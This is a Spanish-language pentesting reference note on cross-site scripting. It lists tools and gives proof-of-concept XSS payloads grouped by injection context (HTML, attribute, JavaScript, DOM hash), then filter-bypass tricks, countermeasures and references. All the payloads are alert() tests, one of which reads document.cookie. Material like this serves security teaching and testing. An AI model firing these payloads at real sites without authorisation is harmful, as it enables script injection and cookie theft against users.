---
title: "Análisis de Vulnerabilidades: Cross-Site Scripting (XSS)"
slug: analisis-xss
aliases: [XSS, Cross-Site Scripting, Reflected XSS, Stored XSS, DOM XSS, Client-Side Template Injection, CSTI, AngularJS sandbox escape]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: [explotacion-xss, analisis-csrf, analisis-seguridad-cabeceras]
learning_refs: [portswigger/reflected-xss-angularjs-sandbox-escape-and-csp, portswigger/reflected-xss-angularjs-sandbox-escape-without-strings, portswigger/reflected-xss-canonical-link-tag, portswigger/reflected-xss-js-string-angle-quotes-encoded, portswigger/reflected-xss-js-string-sq-backslash-escaped, portswigger/reflected-xss-js-template-literal-escapes, portswigger/stored-xss-onclick-html-entity-bypass]
---

# Análisis de Vulnerabilidades: Cross-Site Scripting (XSS)

## Descripción
El Cross-Site Scripting (XSS) ocurre cuando una aplicación web procesa datos de entrada no confiables y los incluye en una página web sin la validación o el escape adecuados. Esto permite la ejecución de scripts maliciosos en el navegador de la víctima. Según *The Web Application Hacker's Handbook*, el éxito del XSS depende críticamente del **contexto** donde se refleja la entrada.

## Herramientas
- **Burp Suite (Intruder/Repeater)** — Esencial para probar caracteres especiales y contextos.
- **XSStrike** — Suite de detección avanzada con análisis de contexto y fuzzing inteligente.
- **Browser DevTools (Console)** — Para depurar la ejecución de scripts y el DOM.
- **SecLists / PayloadsAllTheThings** — Diccionarios especializados para bypass de WAF y filtros.

## Comandos / Ejemplos

### 1. Contexto HTML (Entre etiquetas)
El caso más simple. Si `< >` no están filtrados:
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 2. Contexto de Atributo de Etiqueta
Si la entrada se refleja en un valor de atributo (ej. `<input value="FUZZ">`):
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
```
*Nota: Si las comillas están filtradas, intenta usar atributos que no las requieran o SVG.*

### 3. Contexto JavaScript (Dentro de un bloque <script>)
Si la entrada está dentro de una variable JS:
```javascript
// Código original: var search = 'FUZZ';
'; alert(1); //
'-alert(1)-'
```

### 4. DOM-Based XSS (Vulnerabilidades en el Cliente)
Ocurre cuando el JS del lado del cliente procesa datos de una "fuente" (Source) hacia un "sumidero" (Sink) peligroso.
- **Sources comunes**: `location.search`, `location.hash`, `document.referrer`.
- **Sinks peligrosos**: `eval()`, `setTimeout()`, `document.write()`, `.innerHTML`.
*Ejemplo (usando hash):* `https://target.com/#<img src=x onerror=alert(1)>` si el script lee `location.hash` y lo inserta en el DOM.

### 5. Evasión de Filtros (Bypasses)
- **Codificación**: Usar URL encoding, Hex, o `String.fromCharCode()`.
- **Etiquetas poco comunes**: `<details open ontoggle=alert(1)>`, `<video><source onerror=alert(1)>`.
- **Uso de backticks**: `` alert`1` `` (si los paréntesis están bloqueados).

## Contramedidas
- **Output Encoding**: Codificar los datos según el contexto (HTML Entity para HTML, JS Hex para scripts).
- **Content Security Policy (CSP)**: Restringir qué scripts pueden ejecutarse y desde qué fuentes.
- **HttpOnly Flags**: Evitar que JavaScript acceda a cookies sensibles.
- **X-XSS-Protection**: Aunque deprecada, sigue siendo útil en navegadores antiguos (configurar en `0` para evitar "XSS Auditor leaks" en modernos, o `1; mode=block`).

## Referencias
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
- Hoffman, A. (2020). *Web Application Security: Exploitation and Countermeasures for Modern Web Applications*. O'Reilly Media.
